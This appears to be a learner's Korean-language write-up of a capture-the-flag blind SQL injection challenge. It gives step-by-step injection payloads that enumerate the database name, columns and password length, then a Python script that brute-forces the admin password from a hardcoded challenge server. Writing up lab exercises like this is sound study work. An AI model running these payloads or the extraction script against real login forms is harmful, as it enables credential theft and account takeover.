# 240712 웹 구조

### 📌Check
- Blind SQL Injection 문제 풀기
- 파이썬 스크립트로 자동화하기

### 🔓Simple SQL write-up
Blind SQL Injection 문제

문제 코드는 ```simplesql.php``` 참고!

#### 문제 해석

id, pw값이 채워져 있고, id가 admin이면 사진과 같이 ```admin check!```를 반환한다

![image](https://github.com/user-attachments/assets/f86d807a-0984-4ef1-a08b-afd078b20ae8)
즉, 쿼리 값이 참이면 결과를 반환해주는 것 → 
__Blind SQL Injection__

#### Blind SQL Injection

SQL 취약점은 존재하지만 쿼리의 결과를 알 수 없을 대, 즉 참/거짓만 알 수 있을 때 사용하는 기법

ex. 로그인 기능헤서 SQLi 발생했지만 로그인 성공/실패 여부만 알 수 있음

#### 문제 풀기

1. 데이터베이스 길이 확인
   
   ```?id=admin&password=123' or length(database())>1 -- - ```
   
   위 코드에서 숫자를 하나씩 늘려보면 DB길이는 5라는 것을 알 수 있다.

2. 데이터베이스 이름 찾기
   
   ```?id=admin&password=123' or ascii(substr(database(),1,1))>97 -- - ```

   아스키코드를 참고해서 확인해보면 DB이름은 prob1이다.

3. users 테이블의 첫 번째 컬럼 길이 찾기
   
   ```?id=admin&password=123' or length((select column_name from information_schema.columns where table_name='users' limit 1,1))>1 -- - ```

   ```limit 0,1``` → 0번째 인덱스에서 1개의 값을 가져온다

   첫 번째 컬럼 이름의 값을 가져와서 length를 통해 비교한 결과, 컬럼 이름의 길이는 3

   이런 식으로 컬럼 3개를 다 조회하면 각각 3, 2, 8이다.



4. 컬럼 이름 찾기
   
   ```?id=admin&password=123' or ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1), 1, 1))=110 -- - ```

   substr의 두 번째 인자가 글자의 위치

   각 컬럼 명 *num / id / password* 인 것을 알 수 있다.

5. password 값의 길이 가져오기
   
   ```?id=admin&password=123' or length((select password from users where id='admin'))>1 -- - ```

   users 테이블의 password 컬럼에서 id값이 admin인 것을 찾아야 함.

   비밀번호의 길이는 15인 것을 알 수 있다.

6. password 값 가져오기
   
   password 길이가 15여서 파이썬 코드로 작성해보기로 했다.

    ``` python
    import requests

    def extract_password():
        password = ''
        # password의 각 문자의 ASCII 값을 확인합니다.
        for position in range(1, 16):  # 패스워드 길이를 1부터 15까지 가정
            for ascii_code in range(33, 128):  # 출력 가능한 아스키 코드 범위
                url = "http://13.209.81.224:6060/index.php?id=admin&password=123' or ascii(substr((select password from users where id='admin'),{0},1))={1} -- -".format(position, ascii_code)
                res = requests.get(url)
                if "admin check!" in res.text:
                    password += chr(ascii_code)
                    print("Position {0}: Character {1} with ASCII {2}".format(position, chr(ascii_code), ascii_code))
        print(password)

    # 메인 함수 실행
    extract_password()
    ```
    ![image](https://github.com/user-attachments/assets/f31292d2-8587-4d83-9f8d-2f66a538694f)
    패스워드는 cvfbhfynlrjoi33인 것을 알 수 있다.

#### 문제 해결

플래그 = flag{cvfbhfynlrjoi33}

### ✏️회고

파이썬 코드를 활용해서 푸니까 쉽고 간편했다.
처음부터 이렇게 할 걸..


### 🔗참고한 링크
[1](https://kangmyoungseok.github.io/webhacking/webhacking02/)